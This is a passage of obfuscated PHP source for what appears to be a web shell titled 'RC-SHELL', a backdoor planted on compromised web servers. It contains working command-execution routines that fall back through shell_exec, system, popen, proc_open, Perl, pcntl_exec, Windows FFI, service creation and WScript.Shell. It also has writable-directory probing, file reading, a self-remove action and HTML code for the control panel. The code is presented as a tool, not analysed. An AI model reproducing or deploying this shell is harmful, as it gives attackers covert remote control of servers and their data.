                    $r = @str_replace("[%" . ($i + 1) . "%]", $w[$i], $r);
                }
            }
        } else {
            $r = @str_replace("[%1%]", $w, $r);
        }
    }
    return ($u ? @strtoupper($r) : $r);
}

function z9a() {
    $o = '';
    if (@defined('PHP_OS')) {
        $o = PHP_OS;
    } elseif (@function_exists('php_uname') && @is_callable('php_uname')) {
        $o = @php_uname('s');
    }
    return !@empty($o) ? $o : "*NIX";
}

function z6b() {
    $i = @get_included_files();
    return (@count($i) > 0) ? ($i[0] != __FILE__) : 0;
}

function z9d($d, $s = ':') {
    if ($d != '') {
        if (!@strstr($d, $s)) {
            return array($d);
        }
        return @array_map('trim', @explode($s, $d));
    }
    return array();
}

function z9i($i) {
    foreach (array("a" => "4", "e" => "3", "o" => "0", "s" => "5", "l" => "1", "t" => "7") as $k => $v) {
        $i = @str_replace(array($k, @strtoupper($k)), $v, $i);
    }
    return $i;
}

function z3k() {
    $wwwdir = false;
    if (@isset($_SERVER["SCRIPT_NAME"])) {
        $sn = z1i($_SERVER["SCRIPT_NAME"]);
        if (@realpath($sn)) {
            $sp = z1i(@realpath($sn));
        } else {
            $sp = z1i(@realpath(__FILE__));
        }
        $wwwdir = z1a(@substr($sp, 0, @strpos($sp, $sn)));
    }
    return $wwwdir;
}

function z6k() {
    global $win;
    $s = '/';
    $tmp = array();
    $tp = array();
    $tn = array('/tmp/', '/dev/shm/', '/var/tmp/');
    $tw = array("%WINDIR/temp/");
    $ti = array(@ini_get('session.save_path'), @ini_get('upload_tmp_dir'));
    $te = array('TMP', 'TMPDIR', 'TEMP');
    if ($win) {
        foreach ($tw as $t) {
            $tp[] = $t;
        }
    } else {
        foreach ($tn as $t) {
            $tp[] = $t;
        }
    }
    if (@isset($_ENV)) {
        foreach ($te as $t) {
            if (!@empty($_ENV[$t])) {
                $tp[] = @realpath($_ENV[$t]);
            }
        }
    }
    foreach ($ti as $t) {
        if (!@empty($t)) {
            $tp[] = $t;
        }
    }
    $b = z9d(@ini_get('open_basedir'));
    if (@count($b) > 0) {
        foreach ($b as $t) {
            if (!empty($t)) {
                $tp[] = $t;
            }
        }
    }
    $tp[] = @realpath(@dirname(__FILE__));
    for ($i = 0; $i < @count($tp); $i++) {
        if (!@empty($tp[$i])) {
            $p = @str_replace('\\', $s, $tp[$i]);
            if (@substr($p, -1, 1) != $s) {
                $p .= $s;
            }
            if (!@in_array($p, $tmp)) {
                $f = @md5(@uniqid(@time()));
                $fp = @fopen($p . $f, "w");
                if ($fp) {
                    @fclose($fp);
                    if (@file_exists($p . $f)) {
                        @unlink($p . $f);
                        $tmp[] = @trim($p);
                    }
                }
            }
        }
    }
    return (@count($tmp) > 0) ? $tmp : array("./");
}

function z9p($f) {
    global $nix, $sh_exec;
    $r = '';
    if (z7r('fopen') && z7r('feof') && z7r('fgets') && z7r('feof') && z7r('fclose') && ($fp = @fopen($f, 'r')) !== false) {
        while (!@feof($fp)) {
            $r .= @fgets($fp);
        }
        ;
        @fclose($fp);
    } elseif (z7r('fopen') && z7r('fread') && z7r('fclose') && z7r('filesize') && ($fp = @fopen($f, 'r')) !== false) {
        $r = @fread($fp, @filesize($f));
        @fclose($fp);
    } elseif ($nix && $sh_exec) {
        $r = z9t('cat "' . $f . '" 2>/dev/null', 0);
    } elseif (z7r('file') && ($fl = @file($f))) {
        foreach ($fl as $l) {
            $r .= $l;
        }
    } elseif (z7r('file_get_contents')) {
        $r = @file_get_contents($f);
    } elseif (z7r('readfile')) {
        $r = @readfile($f);
    } elseif (z7r('highlight_file')) {
        $r = @highlight_file($f);
    } elseif (z7r('show_source')) {
        $r = @show_source($f);
    }
    return $r;
}

function z9o($f, $t = '') {
    global $tempdir;
    $s = '';
    if (!$t) {
        $t = @tempnam($tempdir, "copytemp");
    }
    if (@copy("compress.zlib://" . $f, $t)) {
        $s = z9p($t);
        @unlink($t);
    }
    return $s;
}

function z9y($t, $s = '') {
    if (z7r('fopen') && z7r('fwrite') && z7r('fclose') && ($f = @fopen($t, "wb")) !== false) {
        @fwrite($f, $s);
        @fclose($f);
    } elseif (z7r('fopen') && z7r('fputs') && z7r('fclose') && ($f = @fopen($t, "wb")) !== false) {
        @fputs($f, $s);
        @fclose($f);
    } elseif (z7r('file_put_contents')) {
        return @file_put_contents($t, $s);
    } else {
        return 0;
    }
    return 1;
}

function z7r($f) {
    return (@function_exists($f) && @is_callable($f) && !@in_array($f, z6j())) ? 1 : 0;
}

function z4r($v) {
    if ($v == '') {
        return 'no value';
    }
    if (@is_bool($v)) {
        return $value ? 'TRUE' : 'FALSE';
    }
    if ($v === null) {
        return 'NULL';
    }
    if (@is_object($v)) {
        $v = (array) $v;
    }
    if (@is_array($v)) {
        @ob_start();
        print_r($v);
        $v = @ob_get_contents();
        @ob_end_clean();
    }
    return (string) $v;
}

function z6l($i) {
    return (z7r('escapeshellarg')) ? @escapeshellarg($i) : $i;
}

function z9t($c, $h = 1) {
    $r = '';
    if (!empty($c)) {
        if (z7r('shell_exec')) {
            $r = @shell_exec($c);
        } elseif (z7r('system')) {
            @ob_start();
            @system($c);
            $r = @ob_get_contents();
            @ob_end_clean();
        } elseif (z7r('passthru')) {
            @ob_start();
            @passthru($c);
            $r = @ob_get_contents();
            @ob_end_clean();
        } elseif (z7r('exec')) {
            @exec($c, $r);
            $r = @join("\n", $r);
        } elseif (z7r('popen') && @is_resource($f = @popen($c, "r"))) {
            if (z7r('fread') && z7r('feof')) {
                while (!@feof($f)) {
                    $r .= @fread($f, 1024);
                }
            } elseif (z7r('fgets') && z7r('feof')) {
                while (!@feof($f)) {
                    $r .= @fgets($f, 1024);
                }
            }
            @pclose($f);
        } elseif (z7r('proc_open') && @is_resource($f = @proc_open($c, array(1 => array("pipe", "w")), $p))) {
            if (z7r('fread') && z7r('feof')) {
                while (!@feof($p[1])) {
                    $r .= @fread($p[1], 1024);
                }
            } elseif (z7r('fgets') && z7r('feof')) {
                while (!@feof($p[1])) {
                    $r .= @fgets($p[1], 1024);
                }
            }
            @proc_close($f);
        }
    } else {
        $r = z6v($c);
    }
    return ($h ? @htmlspecialchars($r) : $r);
}

function z6v($c) {
    global $win, $tempdir;
    $r = '';
    if (!empty($c)) {
        if (!$win) {
            if (extension_loaded('perl')) {
                @ob_start();
                $p = new perl();
                $p->eval("system('$c')");
                $r = @ob_get_contents();
                @ob_end_clean();
            } elseif (z7r('pcntl_exec') && z7r('pcntl_fork')) {
                $r = '[~] Blind Command Execution via [pcntl_exec]\n\n';
                $o = $tempdir . uniqid('pcntl');
                $pid = @pcntl_fork();
                if ($pid == -1) {
                    $r .= '[-] Could not fork. Exit';
                } elseif ($pid) {
                    $r .= (@pcntl_wifexited($status) ? '[+] Done! Command "' . $c . '" successfully executed.' : '[-] Error. Incorrect Command.');
                } else {
                    $c = array(" -e 'system(\"$c > $o\")'");
                    if (@pcntl_exec('/usr/bin/perl', $c)) {
                        exit(0);
                    }
                    if (@pcntl_exec('/usr/local/bin/perl', $c)) {
                        exit(0);
                    }
                    die();
                }
                $r = z9p($o);
                @unlink($o);
            }
        } else {
            $o = $tempdir . uniqid('NJ');
            if (extension_loaded('ffi')) {
                $a = new ffi("[lib='kernel32.dll'] int WinExec(char *APP,int SW);");
                $r = $a->WinExec("cmd.exe /c " . z6l($c) . " >\"$o\"", 0);
                while (!@file_exists($o)) {
                    sleep(1);
                }

                $r = z9p($o);
            } elseif (extension_loaded('win32service')) {
                $s = uniqid('NJ');
                @win32_create_service(array('service' => $s, 'display' => $s, 'path' => 'c:\\windows\\system32\\cmd.exe', 'params' => "/c " . z6l($c) . " >\"$o\""));
                @win32_start_service($s);
                @win32_stop_service($s);
                @win32_delete_service($s);
                while (!@file_exists($o)) {
                    sleep(1);
                }

                $r = z9p($o);
            } elseif (extension_loaded("win32std")) {
                @win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c ' . z6l($c) . ' > "' . $o . '"');
                while (!@file_exists($o)) {
                    sleep(1);
                }

                $r = z9p($o);
            } else {
                $a = new COM("WScript.Shell");
                $a->Run('c:\\windows\\system32\\cmd.exe /c ' . z6l($c) . ' > "' . $o . '"');
                $r = z9p($o);
            }
            @unlink($o);
        }
    }
    return $r;
}

function z10r() {
    list($u, $s) = @explode(" ", @microtime());
    return ((float) $u + (float) $s);
}

function z4m($c, $i) {
    $a = array('0' => array('container', 'login', 'footer', 'headnfo', 'ql', 'nav', 'sinfo', 'tfilter', 'tahex', 'phpinfo'), '1' => array('list1', 'list2'), '2' => array('lerror', 'topcf', 'topt', 'topc', 'tdfooter', 'tdql', 'tdsinfo', 'tdlsh1', 'tdlsh2', 'tdlsf', 'tdlsfn', 'tdfilter', 'tdhead', 'tdph', 'tdpl', 'tdlbl', 'thex1', 'thex2', 'thex3', 'tdlsf1', 'tdmail'), '3' => array("scroll", "selector", "divls", "dwidth", "barbg", "barfil"), '4' => array('size1', 'size2', 'size3', 'size4', 'size5', 'size6', 'size7', 'size8', 'size9', 'size10'), '5' => array('links', 'slinks', 'button', 'head', 'ql1', 'ql2', 'but1', 'but2', 'but3', 'fimg', 'dirlist', 'filelist', 'ftactive', 'ftcompat', 'ftother', 'qlback', 'mbut1', 'mbut2', 'actbut'), '6' => array('console', 'tgeneric', 'tedit', 'txmail', 'tsql1', 'tsql2', 'tinj'));
    return (@isset($a[$i][$c]) ? $a[$i][$c] : '');
}

function z6z($a = '', $c = '', $s = '') {
    return '<table cellpadding="0" cellspacing="0" border="0"' . (($a != '') ? ' align="' . $a . '"' : '') . (($c != '') ? ' class="' . z4m($c, '0') . '"' : '') . (($s != '') ? z10t($s) : '') . '>' . "\n";
}

function z9m($c = '', $s = '') {
    return z6z('', $c, $s);
}

function z7t($c = '', $s = '') {
    return z6z('left', $c, $s);
}

function z7f($c = '', $s = '') {
    return z6z('right', $c, $s);
}

function z7h($c = '', $s = '') {
    return z6z('center', $c, $s);
}

function z10w() {
    return '</table>' . "\n";
}

function z10e($i, $c = '', $s = '') {
    return z9m($c, $s) . $i . z10w();
}

function z7j($i, $c = '', $s = '') {
    return z7t($c, $s) . $i . z10w();
}

function z7d($i, $c = '', $s = '') {
    return z7f($c, $s) . $i . z10w();
}

function z7s($i, $c = '', $s = '') {
    return z7h($c, $s) . $i . z10w();
}

function z7u() {
    return '</tr>' . "\n";
}

function z6f($v, $c = '', $id = '') {
    return '<tr valign="' . $v . '"' . (($id != '') ? ' id="' . $id . '"' : '') . (($c != '') ? ' class="' . z4m($c, '1') . '"' : '') . '>' . "\n";
}

function z7y($i, $v, $c = '', $id = '') {
    return z6f($v, $c, $id) . $i . z7u();
}

function z9f($i, $c = '', $id = '') {
    return z7y($i, "top", $c, $id);
}

function z7i($i, $c = '', $id = '') {
    return z7y($i, "middle", $c, $id);
}

function z7a($i, $c = '', $id = '') {
    return z7y($i, "bottom", $c, $id);
}

function z7p($c = '', $id = '') {
    return z6f("top", $c, $id);
}

function z6g($c = '', $id = '') {
    return z6f("middle", $c, $id);
}

function z5v($c = '', $id = '') {
    return z6f("bottom", $c, $id);
}

function z5n() {
    return z9f(z9j('&nbsp;'));
}

function z6d() {
    return z10e(z5n());
}

function z5x($a = '', $c = '', $s = '') {
    return '<div' . (($a != '') ? ' align="' . $a . '"' : '') . (($c != '') ? ' class="' . z4m($c, '3') . '"' : '') . (($s != '') ? z10t($s) : '') . '>';
}

function z5j() {
    return '</div>';
}

function z5l($a = '', $c = '', $s = '') {
    return '<td' . (($a != '') ? ' align="' . $a . '"' : '') . (($c != '') ? ' class="' . z4m($c, '2') . '"' : '') . (($s != '') ? z10t($s) : '') . '>' . "\n";
}

function z7k($c = '', $s = '') {
    return z5l('', $c, $s);
}

function z5z($c = '', $s = '') {
    return z5l('left', $c, $s);
}

function z6q($c = '', $s = '') {
    return z5l('right', $c, $s);
}

function z6w($c = '', $s = '') {
    return z5l('center', $c, $s);
}

function z4c($a = '', $n, $c = '', $s = '') {
    return '<td colspan="' . $n . '"' . (($a != '') ? ' align="' . $a . '"' : '') . (($c != '') ? ' class="' . z4m($c, '2') . '"' : '') . (($s != '') ? z10t($s) : '') . '>' . "\n";
}

function z6o($n, $c = '', $s = '') {
    return z4c('', $n, $c, $s);
}

function z4k($n, $c = '', $s = '') {
    return z4c('left', $n, $c, $s);
}

function z4l($n, $c = '', $s = '') {
    return z4c('right', $n, $c, $s);
}

function z4z($n, $c = '', $s = '') {
    return z4c('center', $n, $c, $s);
}

function z7g() {
    return '</td>' . "\n";
}

function z9j($i, $c = '', $s = '') {
    return z7k($c, $s) . $i . z7g();
}

function z7l($i, $c = '', $s = '') {
    return z5z($c, $s) . $i . z7g();
}

function z7e($i, $c = '', $s = '') {
    return z6q($c, $s) . $i . z7g();
}

function z6x($i, $c = '', $s = '') {
    return z6w($c, $s) . $i . z7g();
}

function z6c($i, $n, $c = '', $s = '') {
    return z6o($n, $c, $s) . $i . z7g();
}

function z6u($i, $n, $c = '', $s = '') {
    return z4k($n, $c, $s) . $i . z7g();
}

function z6r($i, $n, $c = '', $s = '') {
    return z4l($n, $c, $s) . $i . z7g();
}

function z6t($i, $n, $c = '', $s = '') {
    return z4z($n, $c, $s) . $i . z7g();
}

function z5w($n = '', $c, $r = 0, $w = '', $h = '') {
    return '<textarea' . ($n != '' ? ' id="' . $n . '" name="' . $n . '"' : '') . ' class="' . z4m($c, '6') . '"' . (($w != '' || $h != '') ? ' style="' . ($w != '' ? 'width:' . $w . 'px;' : '') . ($h != '' ? 'height:' . $h . 'px;' : '') . '"' : '') . ($r ? ' readonly' : '') . '>';
}

function z5q() {
    return '</textarea>';
}

function z9l($t = '', $n = '') {
    return '<form method="POST" action=""' . (($t != '') ? ' target="_blank"' : '') . (($n != '') ? ' name="' . $n . '" id="' . $n . '"' : '') . '>';
}

function z7w($c = '', $t = '') {
    return '<form method="POST" action=""' . (($t != '') ? ' target="_blank"' : '') . (($c != '') ? ' class="' . z4m($c, '3') . '"' : '') . '>';
}

function z7z() {
    return '<form method="POST" action="" enctype="multipart/form-data">';
}

function z7o($u, $t = '', $m = 'GET') {
    return '<form method="' . $m . '" action="' . $u . '"' . (($t != '') ? ' target="_blank"' : '') . '>';
}

function z9z() {
    return '</form>';
}

function z10t($i) {
    $u = array();
    if (!@is_numeric($i)) {
        return '';
    }

    $a = array('border-top:0;', 'border-bottom:0;', 'border-left:0;', 'border-right:0;', 'width: 50%;', 'width: 33%;', 'border-left: 1px solid #DDDDDD;', 'text-align: right !important;', 'width: 150px !important;', 'margin-left: 0 !important;');
    $r = '';
    if (@strlen($i) > 1) {
        for ($n = 0; $n < @strlen($i); $n++) {
            $c = $i[$n];
            if (@isset($a[$c]) && !@isset($u[$c])) {
                $r .= $a[$c];
                $u[$c] = '';
            }
        }
    } else {
        if (@isset($a[$i])) {
            $r .= $a[$i];
        }
    }
    return ($r != '') ? ' style="' . $r . '"' : $r;
}

function z8x($i) {
    return (@is_bool($i) ? (($i) ? '1' : '0') : $i);
}

function z9x($n = 1) {
    return @str_repeat("<br>", $n);
}

function z9c($n = 1) {
    return @str_repeat("&nbsp;", $n);
}

function z6y($t, $c = '') {
    return '<span class="' . $c . '">' . $t . '</span>';
}

function z4p($t) {
    return z6y($t, "nw");
}

function z8z($t) {
    return z6y($t, "nr");
}

function z5i($t) {
    return z6y($t, "rw");
}

function z9k() {
    return ' onfocus="this.select();" onmouseover="this.select();" onmouseout="this.select();"';
}

function z4w($n, $v) {
    global ${$n};
    return '<input type="radio" name="' . $n . '" value="' . $v . '"' . ((@isset(${$n}) && ${$n} == $v) ? ' checked' : '') . '>';
}

function z9g($n, $v = '1', $o = '', $i = '') {
    global ${$n};
    return '<input type="checkbox" id="' . $i . '" name="' . $n . '" value="' . $v . '" style="vertical-align: middle;"' . (($o == '') ? ((${$n} == $v) ? ' checked' : '') : (($o) ? ' checked' : '')) . '>';
}

function z6e($f, $t) {
    return '<label for="' . $f . '">' . $t . '</label>';
}

function z5y($i, $t, $n, $v = '1', $o = '') {
    return z9g($n, $v, $o, $i) . z6e($i, $t);
}

function z9h($n, $c = '', $s = '') {
    return '<input type="file" name="' . $n . '" id="' . $n . '"' . (($c != '') ? ' class="' . z4m($c, '4') . '"' : '') . (($s != '') ? z10t($s) : '') . '>';
}

function z8h($v, $c = '', $o = '') {
    return '<input type="text" value="' . z8x($v) . '"' . (($c != '') ? ' class="' . z4m($c, '4') . '"' : '') . (($o != '') ? z9k() : '') . '>';
}

function z6i($n, $v, $c = '', $o = '', $s = '') {
    return '<input type="text" name="' . $n . '" value="' . z8x($v) . '"' . (($c != '') ? ' class="' . z4m($c, '4') . '"' : '') . ($s != '' ? ' ' . (@is_numeric($s) ? z10t($s) : $s) : '') . (($o != '') ? z9k() : '') . '>';
}

function z5u($n, $v, $c = '', $o = '', $s = '') {
    global ${$n};
    return '<input type="text" name="' . $n . '" value="' . ((@isset(${$n}) && !@empty(${$n})) ? ${$n} : ((@isset($_SESSION[$n])) ? $_SESSION[$n] : z8x($v))) . '"' . (($c != '') ? ' class="' . z4m($c, '4') . '"' : '') . ($s != '' ? ' ' . (@is_numeric($s) ? z10t($s) : $s) : '') . (($o != '') ? z9k() : '') . '>';
}

function z6a($n, $v, $c = '', $o = '') {
    return '<input type="password" name="' . $n . '" value="' . z8x($v) . '"' . (($c != '') ? ' class="' . z4m($c, '4') . '"' : '') . (($o != '') ? z9k() : '') . '>';
}

function z5e($n, $v, $c = '', $o = '') {
    global ${$n};
    return '<input type="password" name="' . $n . '" value="' . ((@isset(${$n}) && !@empty(${$n})) ? ${$n} : z8x($v)) . '"' . (($c != '') ? ' class="' . z4m($c, '4') . '"' : '') . (($o != '') ? z9k() : '') . '>';
}

function z6p($n, $i, $c = '', $s = '') {
    return '<input type="submit" ' . ($n != '' ? ' name="' . $n . '"' : '') . 'value="' . z8x($i) . '"' . (($c != '') ? ' class="' . z4m($c, '5') . '"' : '') . (($s != '') ? (@is_numeric($s) ? z10t($s) : $s) : '') . '>';
}

function z8v($i, $c = '', $s = '') {
    return z6p('', $i, $c, $s);
}

function z1f($t, $i, $a, $c = '') {
    return '<input type="' . $t . '" value="' . $i . '" ' . ($t == 'submit' ? 'onsubmit' : 'onclick') . '="' . $a . '"' . (($c != '') ? ' class="' . z4m($c, '5') . '"' : '') . '>';
}

function z9q($i, $a, $c = '') {
    return z1f('submit', $i, $a, $c);
}

function z8m($i, $a, $c = '') {
    return z1f('button', $i, $a, $c);
}

function z8n($i, $a = '', $c = '', $e = '') {
    global $use_images;
    return ($use_images ? '<input type="image" src="?act=i&amp;img=' . $i . (($e != '') ? '&amp;exe=1' : '') . '" value="' . $a . '" alt="' . $a . '"' . (($c != '') ? ' class="' . z4m($c, '5') . '"' : '') . '>' : z1s(($i == 'small_dir' || $i == 'small_home' ? 'd' : 'f')));
}

function z2x($ip) {
    $ip = @preg_replace('/[\t\s\r\n]/', '', $ip);
    if (!@is_numeric(@str_replace(".", "", $ip)) || @substr_count($ip, ".") != 3) {
        return "failed";
    } else {
        $octets = @explode(".", $ip);
        $dec = ($octets[0] * 1 << 24) + ($octets[1] * 1 << 16) + ($octets[2] * 1 << 8) + ($octets[3]);
        return $dec;
    }
}

function z2n($ip) {
    $ip = @preg_replace('/[\t\s\r\n]/', '', $ip);
    if (!@is_numeric(@str_replace(".", "", $ip)) || @substr_count($ip, ".") != 3) {
        return "failed";
    } else {
        $dec = z2x($ip);
        $hex = "0x" . @dechex($dec);
        return $hex;
    }
}

function z1h($ip, $oct = "") {
    $ip = @preg_replace('/[\t\s\r\n]/', '', $ip);
    if (!@is_numeric(@str_replace(".", "", $ip)) || @substr_count($ip, ".") != 3) {
        return "failed";
    } else {
        $octets = @explode(".", $ip);
        for ($i = 0; $i < 4; $i++) {
            $decoct = @decoct($octets[$i]);
            $len = @strlen($decoct);
            $leading = (9 - $len);
            $oct .= @str_repeat("0", $leading) . $decoct . ".";
        }
        $oct = @substr($oct, 0, @strlen($oct) - 1);
        return $oct;
    }
}

function z9b($n, $v = NULL) {
    global ${$n};
    return '<input type="hidden" name="' . $n . '" value="' . (($v == NULL) ? ((@isset(${$n}) && !@empty(${$n})) ? ${$n} : '') : z8x($v)) . '"' . '>';
}

function z8q($n, $v = NULL) {
    global ${$n};
    return '<input type="hidden" name="' . $n . '" value="' . (($v == NULL) ? ((@isset(${$n}) && !@empty(${$n})) ? ${$n} : ((@isset($_SESSION[$n])) ? $_SESSION[$n] : '')) : z8x($v)) . '"' . '>';
}

function z5k() {
    return (z7r('get_current_user') && @get_current_user() != '') ? @get_current_user() : 'Unknown';
}

function z2s($a = array()) {
    $r = '';
    foreach ($a as $k => $v) {
        $r .= (@is_numeric($k) ? z9b($v) : z9b($k, $v));
    }
    return $r;
}

function z8g($n, $v = NULL) {
    global ${$n};
    return (($v == NULL) ? ((@isset(${$n}) && !@empty(${$n})) ? ${$n} : '') : z8x($v));
}

function z3e($a = array()) {
    if (@isset($a['backf'])) {
        return z2s($a);
    }

    $r = '';
    foreach ($a as $k => $v) {
        $r .= (@is_numeric($k) ? $v . '=' . @urlencode(z8g($v)) : $k . '=' . @urlencode(z8g($k, $v))) . '&';
    }
    if ($r != '') {
        $r = z9b('merged', @base64_encode($r));
    }
    return $r;
}

function z8w($a, $t = '', $u = 0) {
    return ($u ? z7z() : z9l($t)) . z3e($a);
}

function z5c($a, $i, $t = '') {
    return z8w($a, $t) . $i . z9z();
}

function z5m($a, $i) {
    return z8w($a, '', 1) . $i . z9z();
}

function z8e($i) {
    return '<span style="font-size: 9px; color: #333333; font-weight: bold;">' . $i . '&nbsp; </span>';
}

function z5t($i) {
    return z7e((!@empty($i) ? z8e($i) : $i), '15');
}

function z5b($l, $i) {
    return z6x(z8e($l) . $i, '1');
}

function z10y($h, $n, $c = '', $t = '') {
    return '<a href="' . $h . '"' . (($c != '') ? ' class="' . z4m($c, '5') . '"' : '') . (($t != '') ? ' target="_blank"' : '') . '>' . $n . '</a>';
}

function z6s($f) {
    global $nix, $sh_exec;
    $m = '';
    if (z7r('md5_file') && @md5_file($f) !== false) {
        $m = @md5_file($f);
    } elseif ($nix && $sh_exec) {
        $m = z9t('md5sum "' . $f . '"', 0);
        if (@strstr($m, ' ')) {
            $m = @substr($m, 0, @strpos($m, ' '));
        }
    }
    return (@strlen($m) == 32) ? $m : false;
}

function z3b() {
    global $linux, $saddr, $dtotal, $dfree, $bsafe, $bopendir, $bmysql, $bmssql, $boracle, $bpostgres, $bcurl, $use_images;
    $a = @explode(" ", @getenv("SERVER_SOFTWARE"));
    $b = @explode("-", @phpversion());
    if (@isset($a[0])) {
        $www = $a[0];
    } else {
        $www = "Unknown";
    }
    $www .= z9c(1) . z5c(array('act' => 'phpinfo', 'd'), z8v("PHP/" . $b[0], '0'));
    echo z10e(z7i(z7l(z7o('http://whois.domaintools.com/' . $saddr, '1', 'POST') . z8v(z9s("4"), '0') . z9z() . z9c(5) . z7o('http://www.domaintools.com/research/traceroute/?query=' . $saddr, '1', 'POST') . z8v(z9s("5"), "0") . z9z(), '6', '5') . z7e(z5c(array('act' => 'selfremove', 'd'), z8v(z9s("6"), '0')) . z9c(5) . z5c(array('act' => 'logout', 'd'), z8v(z9s("7"), '0')), '6', '5')), '6');
    echo z10e(z7i(z6x(z9s("8"), '2', '2') . (($linux) ? z6x(z9s("9"), '2') : '') . z6x(z9s("1"), '2') . z6x(z9s("10"), '2') . z6x(z9s("11"), '2') . z6x(z9s("12"), '2') . z6x(z9s("13"), '2') . z6x(z9s("14"), '2') . z6x(z9s("15"), '2') . z6x(z9s("16"), '2') . z6x(z9s("17"), '2') . z6x(z9s("18"), '2')) . z7i(z6x(z9a(), '3', '2') . (($linux) ? z6x(@php_uname('r'), '3') : '') . z6x(z5k(), '3') . z6x($dtotal . ' / ' . $dfree, '3') . z6x($www, '3') . z6x(($bsafe ? z6y(z9s("19"), 'nr') : z6y(z9s("20"), 'rw')), '3') . z6x(($bopendir ? z6y(z9s("21"), 'nr') : z6y(z9s("424"), 'rw')), '3') . z6x(($bcurl ? z6y(z9s("21"), 'rw') : z9s("22")), '3') . z6x(($bmysql ? z6y(z9s("21"), 'rw') : z9s("22")), '3') . z6x(($bmssql ? z6y(z9s("21"), 'rw') : z9s("22")), '3') . z6x(($boracle ? z6y(z9s("21"), 'rw') : z9s("22")), '3') . z6x(($bpostgres ? z6y(z9s("21"), 'rw') : z9s("22")), '3')), '3');
}

function z3l($login = 0) {
    global $act, $use_images, $sh_exec, $safe_exec, $ft, $nogradient;
    echo '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html">
' . ($use_images ? '<link rel="shortcut icon" href="?act=i&amp;img=exe">' : '') . '
' . ((!$login) ? '<title>[ RC-SHELL v' . z7x('0') . (!@empty($_SERVER["SERVER_NAME"]) ? ' - ' . $_SERVER["SERVER_NAME"] : '') . (!@empty($_SERVER["SERVER_ADDR"]) ? ' - ' . $_SERVER["SERVER_ADDR"] : '') . ' ]</title>' : '<title>' . z9s("0") . '</title>') . '
<style type="text/css">
body, table, tr, td, div, select, input, textarea, pre, code { font: 100% ' . z9w("fontfam") . '; text-decoration: none; }
td, div { max-width: ' . z7x('5', "width") . 'px; }
input, select, textarea { border: 0; padding: 0; }
input, select, textarea { -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; -ms-box-sizing: border-box; }
input::-moz-focus-inner { border: 0;padding: 0; }
body { background-color: ' . z9w("bodybg") . '; font-family: ' . z9w("fontfam") . ' !important; font-size: 10px !important; color: ' . z9w("fontcolor") . ';}
*:focus {outline: none;}
.but1, .but2, .but3, .actbut, .but1:active, .but2:active, .but3:active .actbut:active { border: 1px solid #cccccc; margin-left: 1px; text-shadow: 1px 1px 2px #ffffff; vertical-align: middle; }
.but1, .but2, .but3, .actbut { ' . z2o("#F5F5F5", "#E0E0E0") . ' }
.but1:hover, .but2:hover, .but3:hover, .actbut:hover { ' . z2o("#E0E0E0", "#F5F5F5") . ' cursor: pointer; }
.but1 { width: 28px; height: 18px; font-size: 10px; font-weight: bold; }
.but2 { color: #4F4F4F; padding: 0 10px 0 10px; height: 20px; font-size: 10px; }
.actbut { color: #4F4F4F; padding: 0 10px 0 10px; height: 18px; font-size: 10px; font-weight: normal; }
' . (($login) ? '
.login { background: ' . z9w("tablebg") . '; border: 1px solid ' . z9w("tableborder") . '; -moz-box-shadow: ' . z9w("tableshadow") . ' 0 0 8px; -webkit-box-shadow: 0 0 8px ' . z9w("tableshadow") . '; box-shadow: 0 0 8px ' . z9w("tableshadow") . '; margin-top: 150px; padding: 10px; text-align: left; }
.login td { padding: 0; }
.login input {  background-color: #FFFFFF; border: 1px solid #CCCCCC; color: #333333; margin: 1px; margin-right: 0; height:20px; width:150px; font-size: 10px; text-shadow: 1px 1px 5px #dddddd; vertical-align: middle; }
.lerror { color: ' . z9w('errcolor') . '; padding-bottom: 10px !important; }
' : '
.container { background: ' . z9w("tablebg") . '; width: ' . z7x('5', "width") . 'px; border: 1px solid ' . z9w("tableborder") . '; -moz-box-shadow: ' . z9w("tableshadow") . ' 0 0 8px; -webkit-box-shadow: 0 0 8px ' . z9w("tableshadow") . '; box-shadow: 0 0 8px ' . z9w("tableshadow") . '; }
form { display: inline; }
label { display: inline-block; vertical-align: baseline; }
a { text-decoration: none; }
.links, .links:active, .links:visited { background-color: transparent; color: ' . z9w("tlinkcolor") . '; text-shadow: 1px 1px 3px ' . z9w("tlinkshadow") . '; padding: 0; font-size: 10px; font-weight:normal; vertical-align: middle; vertical-align: inherit !important; }
.links:hover { color: ' . z9w("tlinkcolorhover") . '; cursor: pointer; }
.slinks { background-color: transparent; color: ' . z9w('dircolor') . '; font-size: 11px; font-weight: normal; }
.slinks:hover { cursor: pointer; }
.sinfo { width: 100%; }
.tdsinfo { ' . z2o(z9w("tbarbg1"), z9w("tbarbg2")) . ' border-bottom: 1px solid ' . z9w("tbarborderb") . '; border-top: 1px solid ' . z9w("tbarbordert") . '; padding: 4px; }
.tdsinfo .links { font-size: 9px; }
.tdsinfo span { vertical-align: middle; }
.topcf { vertical-align: middle; }
.topt { ' . z2o(z9w("topbg1"), z9w("topbg2")) . ' border-top: 1px solid ' . z9w("topborder1") . '; color: ' . z9w("topcolor") . '; text-shadow: 1px 1px 5px ' . z9w("topshadow") . '; padding-top: 10px; font-size: 9px; font-weight: bold; vertical-align: middle; }
.topc { background: ' . ((@isset($nogradient) && $nogradient) ? z9w("topbg1") : z9w("topbg2")) . '; color: ' . z9w("topcolor") . '; padding-bottom: 10px; vertical-align: middle; }
.nav { ' . z2o("#ffffff", "#f3f3f3") . ' border-bottom: 1px solid #f0f0f0; padding: 2px 0 2px 2px; width: 100%; }
.footer { width: 100%; }
.tdfooter { ' . z2o(z9w("footerbg1"), z9w("footerbg2")) . ' border-top: 1px solid ' . z9w("footerborder1") . '; padding: 3px; color: ' . z9w("footercolor") . '; text-shadow: 1px 1px 5px ' . z9w("footershadow") . '; font-size: 9px; font-weight: bold; vertical-align: middle; }
.headnfo { width: 100%; }
.ql { width: 100%; }
.tdql { background-color: transparent; border-top: 1px solid ' . z9w("qlbg2") . '; border-bottom: 3px solid #E0E0E0; }
.ql1, .ql2, .qlback { font-size: 10px; font-weight: bold; }
.ql1 { ' . z2o("#fefefe", "#E0E0E0", 1) . ' border: 1px solid #EFEAEF; border-bottom: 0; color: #030303; width:100%; height: 22px; text-shadow: #cccccc 2px -1px 10px; }
